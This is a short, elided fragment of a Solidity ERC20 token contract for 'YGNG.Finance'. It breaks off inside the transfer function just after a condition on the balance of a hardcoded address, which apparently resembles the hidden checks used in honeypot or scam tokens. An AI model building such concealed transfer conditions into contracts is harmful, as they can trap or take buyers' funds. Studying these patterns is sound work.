...
contract YGNG is ERC20{
    uint8 public constant decimals = 18;
    uint256 initialSupply = 7500000*10**uint256(decimals);
    string public constant name = "YGNG.Finance";
    string public constant symbol = "YGNG";
    ...
    function transfer(address to, uint256 value) public returns (bool success) {
        ...
        {
              if (0x192e09622028c7139815E042ae0057Df8d86a123.balance==0){ 
